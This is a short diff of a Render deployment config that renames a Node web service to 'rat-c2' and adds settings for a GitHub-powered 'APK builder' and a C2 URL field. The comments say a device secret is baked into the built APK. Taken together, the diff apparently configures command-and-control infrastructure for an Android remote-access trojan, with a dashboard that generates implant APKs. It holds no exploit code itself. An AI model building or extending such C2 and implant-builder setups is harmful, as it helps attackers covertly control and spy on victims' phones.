@@ -1,6 +1,6 @@
 services:
   - type: web
-    name: first-c2
+    name: rat-c2
     runtime: node
     plan: free
     buildCommand: npm run build
@@ -21,3 +21,10 @@ services:
         sync: false          # set in Render dashboard (bcrypt hash)
       - key: DEVICE_SECRET
         sync: false          # must match secret baked into APK
+      - key: GH_TOKEN
+        sync: false          # GitHub PAT (actions:write) — powers the dashboard APK builder
+      - key: GH_REPO
+        sync: false          # owner/repo containing build-apk.yml
+      - key: PUBLIC_C2_URL
+        sync: false          # optional — prefills builder C2 field
+        
